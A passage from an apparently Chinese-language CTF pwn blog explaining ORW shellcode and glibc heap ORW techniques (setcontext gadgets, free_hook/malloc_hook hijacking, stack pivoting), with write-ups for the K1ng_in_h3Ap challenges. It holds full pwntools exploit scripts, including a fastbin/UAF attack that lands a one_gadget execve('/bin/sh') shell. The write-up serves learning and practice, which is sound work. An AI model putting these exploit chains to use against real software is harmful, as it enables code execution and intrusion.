<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov eax,0x3; <br>mov ecx,ebx;	# ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”<br>mov ebx,0x3;	# 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件<br>mov edx,0x100;	#对应字节数<br>int 0x80;<br></code></pre></td></tr></table></figure>


<p>输出flag文件内容，sys_write(1,file,0x30)；系统调用号为4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov eax,0x4;	# eax = sys_write<br>mov ebx,0x1;	# ebx = unsigned int fd = 1<br>int 0x80;<br></code></pre></td></tr></table></figure>

<p>exp1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27948</span>)<br><br>shellcode=asm(<span class="hljs-string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>exp2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27948</span>)<br>shellcode=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x30</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="二、easy-shellcode"><a href="#二、easy-shellcode" class="headerlink" title="二、easy_shellcode"></a>二、easy_shellcode</h3><p>来自2021NEEPU 纳新CTF上的一道题</p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522123857.png"></p>
<p>64位，保护全开</p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522123942.png"></p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522130822.png"></p>
<p>跟上面很类似，也是有个直接输入点，然后调用执行输入的数据，借用shellcraft，把寄存器改为64位下的即可获取flag</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;neepusec.club&quot;</span>,<span class="hljs-number">18626</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>shellcode+=asm(shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>shellcode+=asm(shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;orw&quot;</span>,shellcode)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h2 id="堆上orw"><a href="#堆上orw" class="headerlink" title="堆上orw"></a>堆上orw</h2><p>前面呢，都是一些有关于orw思想的入门基础题，而比赛中常见的都是堆上的orw</p>
<h3 id="glibc-2-23-2-29"><a href="#glibc-2-23-2-29" class="headerlink" title="glibc-2.23~2.29"></a>glibc-2.23~2.29</h3><p>一般在 <code>Glibc2.29</code>以前的 <code>ORW</code>解题思路已经比较清晰，主要是劫持 <code>free_hook</code> 或者 <code>malloc_hook</code>写入 <code>setcontext+53</code>函数中的 gadget，通过 <code>rdi</code>索引，来设置相关寄存器，并执行提前布置好的 <code>ORW ROP chains</code></p>
<p>setcontext+53处的gadget如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]<br>&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]<br>&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]<br>&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]<br>&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]<br>&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]<br>&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]<br>&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]<br>&lt;setcontext+94&gt;:  push   rcx<br>&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]<br>&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]<br>&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]<br>&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]<br>&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]<br>&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]<br>&lt;setcontext+125&gt;: xor    eax,eax<br>&lt;setcontext+127&gt;: ret<br></code></pre></td></tr></table></figure>

<p>目的是获得一个可执行的权限，需要注意的是<code>mov rsp, [rdi+0xa0]</code>和<code>mov rcx, [rdi+0xa8]</code>。修改rsp的值将会改变栈指针，因此我们就获得了控制栈的能力，修改rcx的值后接着有个push操作将rcx压栈，然后汇编指令按照顺序会执行代码中最后的ret操作，而ret去执行的地址就是压入栈的rcx值，因此修改rcx就获得了控制程序流程的能力</p>
<p>但是为了能执行到这，我们先要做的就是劫持 free_hook 为<code>setcontext + 53</code>的地址，跳转到这边来执行上面的gadgets，但这都不是重点，重点是<code>setcontext + 53</code>上的传参设置。因为都是借用rdi传参，刚好我们执行 free 释放堆块时，传入的第一个参数是堆的地址，是存在rdi上的，所以我们要释放的堆块的地址十分关键，在其偏移0xa0和0xa8的位置分别填上我们存储orw链内容的地址（注意不是orw的第一个指令地址）和一个ret汇编指令的地址</p>
<p>注：为什么不能直接是orw的地址：因为执行完setcontext + 53上的gadget会执行ret，而ret执行的rcx指向的地址，如果rcx装的是mprotect的地址，执行完mprotect就会去执行rsp指向的地址，注意是地址！如果前面直接传入rsp的是orw的第一个指令地址，那么ret执行的是把写在上面的指令作为一个地址解析，直接就会报错了，因为rip获取的是栈顶的值，所以要中转一下，前面写的是另外一个地址（一般就直接在shellcode前八个字节的地方），然后在这个地址上写入的才是shellcode的地址</p>
<p>可以自己算偏移，也可以借用pwntools的SigreturnFrame类直接来构造。此时frame中的rsp和rip对应的就是setcontext的rsp和rcx</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">context.arch</span> = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-attr">frame</span> = SigreturnFrame()<br><span class="hljs-attr">frame.rsp</span> = shellcode_addr<br><span class="hljs-attr">frame.rip</span> = ret_addr<br></code></pre></td></tr></table></figure>

<p>例题查看我之前的比赛复现题目：<code>K1ng_in_h3Ap_II</code>，<code>Whats your name</code></p>
<h3 id="glibc-2-29及以上"><a href="#glibc-2-29及以上" class="headerlink" title="glibc-2.29及以上"></a>glibc-2.29及以上</h3><p>但在 <code>Glibc 2.29</code>开始之后 <code>setcontext + 61</code>中的gadget变成了以 <code>rdx</code>索引，因此如果我们按照之前思路的话，还要先通过 <code>ROP</code>控制 <code>RDX</code>的值，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">.text:00000000000580DD                 mov     rsp, [rdx+0A0h]<br>.text:00000000000580E4                 mov     rbx, [rdx+80h]<br>.text:00000000000580EB                 mov     rbp, [rdx+78h]<br>.text:00000000000580EF                 mov     r12, [rdx+48h]<br>.text:00000000000580F3                 mov     r13, [rdx+50h]<br>.text:00000000000580F7                 mov     r14, [rdx+58h]<br>.text:00000000000580FB                 mov     r15, [rdx+60h]<br>.text:00000000000580FF                 test    dword ptr fs:48h, 2<br>    ....<br>.text:00000000000581C6                 mov     rcx, [rdx+0A8h]<br>.text:00000000000581CD                 push    rcx<br>.text:00000000000581CE                 mov     rsi, [rdx+70h]<br>.text:00000000000581D2                 mov     rdi, [rdx+68h]<br>.text:00000000000581D6                 mov     rcx, [rdx+98h]<br>.text:00000000000581DD                 mov     r8, [rdx+28h]<br>.text:00000000000581E1                 mov     r9, [rdx+30h]<br>.text:00000000000581E5                 mov     rdx, [rdx+88h]<br>.text:00000000000581EC                 xor     eax, eax<br>.text:00000000000581EE                 retn<br></code></pre></td></tr></table></figure>

<p>所以在 glibc-2.29~2.33  是使用新的 gadget 来进行构造出 rop 读 flag，触发方式并未改变，仍旧是选择使用 __free_hook 来触发。</p>
<h4 id="gadget1"><a href="#gadget1" class="headerlink" title="gadget1"></a>gadget1</h4><p>这其中用到的 <code>gadget</code>是 <code>getkeyserv_handle+576</code>，其汇编如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov     rdx, [rdi+8]<br>mov     [rsp+0C8h+var_C8], rax<br>call    qword ptr [rdx+20h]<br></code></pre></td></tr></table></figure>

<p>这个 <code>gadget</code>可以通过 <code>rdi</code> 来控制 <code>rdx</code>， 非常好用，而且从 Glibc2.29 以上都可用</p>
<p>控制 <code>rdx</code>之后，我们就可以通过 <code>setcontext</code>来控制其他寄存器了</p>
<p>可以用下面的命令进行查询</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">ROPgadget --binary libc.<span class="hljs-keyword">so</span>.<span class="hljs-number">6</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;mov rdx, qword ptr \[rdi&quot;</span><br></code></pre></td></tr></table></figure>

<p>这条 <code>gadget</code> 可以配合以下的 <code>gadget</code> 使用，比起 setcontext + 61 更加合适，需要的堆块长度更小。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov     rsp, rdx<br>ret<br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ROPgadget</span> --binary ./libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so | grep <span class="hljs-string">&quot;mov rsp, rdx ; ret&quot;</span><br></code></pre></td></tr></table></figure>

<p>这两个的结合使用时（因为是把 rdx 赋值给 rsp，所以需要读入新的数据把 rdx + 0x20 指向的 gadget 进行覆盖），可以对分配到 __free_hook 的堆块进行布局，布局如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">gadget1 <span class="hljs-comment"># mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>gadget2 <span class="hljs-comment"># mov rsp, rdx ; ret</span><br>payload = p64(gadget1) + p64(free_hook + <span class="hljs-number">0x10</span>) + p64(leak + libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>]) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(gadget2)<br></code></pre></td></tr></table></figure>

<p>然后发送 rop 链子即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">rop = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>rop += p64(pop_rdi) + p64(free_hook + <span class="hljs-number">0x10</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(free_hook) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) +  p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(free_hook) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(write)<br></code></pre></td></tr></table></figure>

<h4 id="gadget2"><a href="#gadget2" class="headerlink" title="gadget2"></a>gadget2</h4><p>通过 gadget 控制 rbp 的值，从而进行栈迁移，将栈劫持到我们可以控制的堆地址上，并执行预先布置的 rop 链，从而获取 flag</p>
<p>先介绍一下万金油的 gadget <code>svcudp_reply+26</code>，汇编如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov rbp, qword ptr [rdi + 0x48]; <br>mov rax, qword ptr [rbp + 0x18]; <br>lea r13, [rbp + 0x10]; <br>mov dword ptr [rbp + 0x10], 0; <br>mov rdi, r13; <br>call qword ptr [rax + 0x28];<br></code></pre></td></tr></table></figure>

<p>这个 gadgets 主要是通过 <code>rdi</code>控制 <code>rbp</code>进而控制 <code>rax</code>并执行跳转，由于我们已经控制了 <code>rbp</code>的值，因此需要在 <code>rax+0x28</code>的位置部署 <code>leave ；ret</code> 以及最初的 rbp位置也布置 <code>leave ；ret</code> ，让 rsp 再跳一个地方，即可完成栈迁移（因为如果只有一次的话，之前的  rbp + 0x10 和 rbp + 0x18 是无法写入正确写入 rop 的）</p>
<p>从而在我们已经布置好 <code>orw rop链</code>的位置伪造栈地址并劫持控制流，最终读取<code>flag</code></p>
<p>来源：<a href="https://www.anquanke.com/post/id/236832">https://www.anquanke.com/post/id/236832</a></p>
<p>​            <a href="http://blog.eonew.cn/archives/993">http://blog.eonew.cn/archives/993</a></p>
<p>​            <a href="https://blog.csdn.net/A951860555/article/details/118268484">https://blog.csdn.net/A951860555/article/details/118268484</a></p>
]]></content>
      <tags>
        <tag>orw</tag>
      </tags>
  </entry>
  <entry>
    <title>2021长城杯PWN</title>
    <url>/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次一共三题pwn，两题其实都是比较常见的堆题，可惜只做出了一题，还有一题堆上的orw在比赛前没能出 。不过总的来说：比之前还是进步了很多，加油</p>
<h2 id="K1ng-in-h3Ap-I"><a href="#K1ng-in-h3Ap-I" class="headerlink" title="K1ng_in_h3Ap_I"></a>K1ng_in_h3Ap_I</h2><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161053043.png"><span class="image-caption">image-20210921161053043</span></p>
<p>毫无疑问的64位，保护全开</p>
<p>程序一共有着三个功能以及一个好心送我们的三字节libc地址</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161202941.png"><span class="image-caption">image-20210921161202941</span></p>
<p>输入666会打印出后三字节地址</p>
<p>申请堆块没有特殊的，只是不能申请大于0xF0的堆块</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161426698.png"><span class="image-caption">image-20210921161426698</span></p>
<p>写入功能存在着offbyone，还要注意的就是交互要输入’\n’才能结束，否则就要输入完所有长度数据</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161337239.png"><span class="image-caption">image-20210921161337239</span></p>
<p>释放功能存在UAF</p>
<p>所以我的思路是借着offbyone生成unsorted chunk，得到libc地址，然后再将他分为一块大小为为0x70的fast chunk，借用UAF对着libc后三位进行覆盖，覆盖成stdout的地址，将堆块分配到stdout上，吐出libc地址。然后故技重施，再分配到__malloc_hook上，但是还要借用relloc调整一下才行</p>
<p>看了别人的wp，对于第一次把chunk分配到stdout还有别的思路：先释放一块unsorted chunk，然后申请回来0x70大小的fast chunk，此时这块chunk上也是会残留着libc地址（正常的malloc是不会清零的），然后释放两个fast chunk进入bin链，将后进的那块，借用UAF把fd指针修改成指向有着libc地址的那个chunk，这时也能将堆块申请到stdout上</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;input size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;input context:&quot;</span>)<br>	p.sendline(content)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">6</span>),<span class="hljs-number">16</span>) <br>log.success(<span class="hljs-built_in">hex</span>(addr))<br>stdout = (addr + <span class="hljs-number">0x36FE10</span>) &amp; <span class="hljs-number">0xFFFFFF</span><br>log.info(<span class="hljs-string">&quot;stdout==&gt;0x%x&quot;</span> %stdout)<br>low = stdout &amp; <span class="hljs-number">0xFFFF</span><br>high = (stdout &gt;&gt; <span class="hljs-number">16</span>) &amp;<span class="hljs-number">0xFF</span><br>log.info(<span class="hljs-string">&quot;low==&gt;0x%x&quot;</span> %low)<br>log.info(<span class="hljs-string">&quot;high==&gt;0x%x&quot;</span> %high)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">&#x27;\xa1&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>edit(<span class="hljs-number">2</span>,p16(low - <span class="hljs-number">0x43</span>) + p8(high))<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)<br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span> <br>edit(<span class="hljs-number">4</span>,payload)<br>p.recv(<span class="hljs-number">0x40</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c5600</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + <span class="hljs-string">&#x27;\xa1&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x28</span>)<br>edit(<span class="hljs-number">3</span>,p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>)<br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>log.info(<span class="hljs-string">&quot;__libc_realloc==&gt;0x%x&quot;</span> %realloc)<br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>) + p64(ogg) + p64(realloc+<span class="hljs-number">16</span>)<br>edit(<span class="hljs-number">5</span>,payload)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x20</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="K1ng-in-h3Ap-II"><a href="#K1ng-in-h3Ap-II" class="headerlink" title="K1ng_in_h3Ap_II"></a>K1ng_in_h3Ap_II</h2><p>来源：<a href="https://blog.csdn.net/eeeeeight/article/details/120386415">https://blog.csdn.net/eeeeeight/article/details/120386415</a></p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921163803827.png"><span class="image-caption">image-20210921163803827</span></p>
<p>常规checksec，64位保护全开。在程序上跟上题是差不多的，少了666的地址泄露以及offbyone漏洞，但是多了打印功能，以及libc版本提升至2.27，至于2.27，就是标志性的tcache bin</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922131449936.png"><span class="image-caption">image-20210922131449936</span></p>
<p>然后申请的size只能是在0x10~0x60</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132037509.png"><span class="image-caption">image-20210922132037509</span></p>
<p>UAF依然存在</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132136392.png"><span class="image-caption">image-20210922132136392</span></p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132215898.png"><span class="image-caption">image-20210922132215898</span></p>
<p>多了一层沙箱，看到这个基本都是orw的思路：借用setcontext + 53上的gadgets，调用mprotect使得堆可执行，然后执行布置在堆上的rop链，读取flag</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132710147.png"><span class="image-caption">image-20210922132710147</span></p>
<p>申请0x50的堆块是因为链上没有0x60的空闲堆块，所以申请出来的堆块是在最底下的（与top chunk相近的）并且两块是连续的，好算偏移</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922133019126.png"><span class="image-caption">image-20210922133019126</span></p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922133236908-16322992251781.png"><span class="image-caption">image-20210922133236908</span></p>
<p>然后先后释放，借用UAF泄露出堆上地址，进而计算tcache地址</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922162651147.png"><span class="image-caption">image-20210922162651147</span></p>
<p>然后把我们之后要申请用到的堆块的count数量改为2，以及把unsorted chunk的count全部一次性改为7，为后续释放unsorted chunk进入bin链泄露libc基址做工作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#修改tcache bin</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak_heap=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak heap: &#x27;</span>+<span class="hljs-built_in">hex</span>(leak_heap))<br>next_heap=leak_heap + <span class="hljs-number">0xc0</span><br>tc_addr=leak_heap - <span class="hljs-number">0xf60</span><br>log.success(<span class="hljs-string">&#x27;tc addr: &#x27;</span>+<span class="hljs-built_in">hex</span>(tc_addr))<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>, p64(tc_addr))<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922162838313.png"><span class="image-caption">image-20210922162838313</span></p>
<p>修改之前释放堆块的fd指针指向0x20堆块，而前面也修改了0x60堆块的count数量为2，所以可以申请，造成overlap，之后修改0x20堆块的size，申请0x30的堆块，（原因是这个大小的堆块是不存在空闲的堆块，所以可以全部相邻在一起，方便操作）。把底下的堆块都包含在内，记得要留一个防止与top chunk进行合并</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922163245528.png"><span class="image-caption">image-20210922163245528</span></p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922163344836.png"><span class="image-caption">image-20210922163344836</span></p>
<p>然后释放得到libc地址</p>
